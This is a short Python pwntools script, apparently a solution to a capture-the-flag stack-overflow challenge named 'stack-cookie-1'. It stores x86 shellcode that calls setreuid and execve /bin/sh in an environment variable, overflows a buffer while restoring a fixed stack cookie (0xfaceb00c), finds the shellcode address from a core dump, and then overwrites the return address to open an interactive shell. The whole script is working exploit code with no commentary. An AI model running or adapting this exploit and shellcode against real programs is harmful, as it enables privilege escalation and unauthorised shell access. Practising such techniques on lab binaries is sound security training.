#!/usr/bin/env python

from pwn import *

env = {
	"SHELC":"j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"
}

p = process("./stack-cookie-1", env=env)

buffer = "A"*0x84 + p32(0xfaceb00c) + "AAAA" + "IIII"

p.sendline(buffer)
p.wait()

c = Core('core')

shell_command_addr = c.stack.find("SHELC")
shell_command_addr += 6

p = process("./stack-cookie-1", env=env)

buffer = "A"*0x84 + p32(0xfaceb00c) + "AAAA" + p32(shell_command_addr)

p.sendline(buffer)
p.interactive()
